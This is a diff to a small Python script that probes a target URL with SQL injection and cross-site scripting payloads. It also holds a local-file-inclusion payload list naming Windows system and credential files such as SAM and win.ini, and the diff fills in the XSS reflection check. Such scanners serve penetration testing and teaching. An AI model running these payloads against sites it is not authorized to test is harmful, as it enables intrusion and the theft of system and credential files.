@@ -1,3 +1,4 @@
+#!python3
 import argparse, urllib.request, os, sys
 
 sqli = ["'", "\"", "`", "and 1=0", "or 1=0", "' and 1=0", "' or 1=0", "\" and 1=0", "\" or 1=0", "`and 1=0", "` or 1=0"]
@@ -14,11 +15,11 @@ xss = ["';alert(String.fromCharCode(88,83,83))//",
        "<IMG \"\"\"><SCRIPT>alert(\"XSS\")</SCRIPT>\">",
        "<IMG SRC=javascript:alert(String.fromCharCode(88,83,83))>"]
 lfi = ["C:\boot.ini",
-       "C:\WINDOWS\win.ini",
-       "C:\WINNT\win.ini",
-       "C:\WINDOWS\Repair\SAM",
-       "C:\WINDOWS\php.ini",
-       "C:\WINNT\php.ini",
+        "C:\WINDOWS\win.ini",
+        "C:\WINNT\win.ini",
+        "C:\WINDOWS\Repair\SAM",
+        "C:\WINDOWS\php.ini",
+        "C:\WINNT\php.ini",
         "C:\Program Files\Apache Group\Apache\conf\httpd.conf",
         "C:\Program Files\Apache Group\Apache2\conf\httpd.conf",
         "C:\Program Files\\xampp\apache\conf\httpd.conf",
@@ -52,7 +53,6 @@ def clearScreen():
 def get():
     x = input("\n\t1. SQLi\n\t2. XSS\n\t3. LFI\n\t4. RFI\n\t5. RCE\n")
     if x=="1":
-        with open("sql_errors.txt", "r") as f:l=f.readlines()
         for i in sqli:
             req = args.url + i
             try:
@@ -65,7 +65,19 @@ def get():
                 print(html)
                 break
 
-    elif x=="2":atk = xss
+    elif x=="2":
+        for i in xss:
+            req = args.url + i
+            try:
+                with urllib.request.urlopen(req) as response:
+                   html = str(response.read())
+                if i in html:
+                    print("\nLikely vulnrable.")
+                    break
+            except Exception as e:
+                print(type(e))
+                print(e)
+                print(html)
     elif x=="3":atk = lfi
     elif x=="4":atk = rfi
     elif x=="5":atk = rce
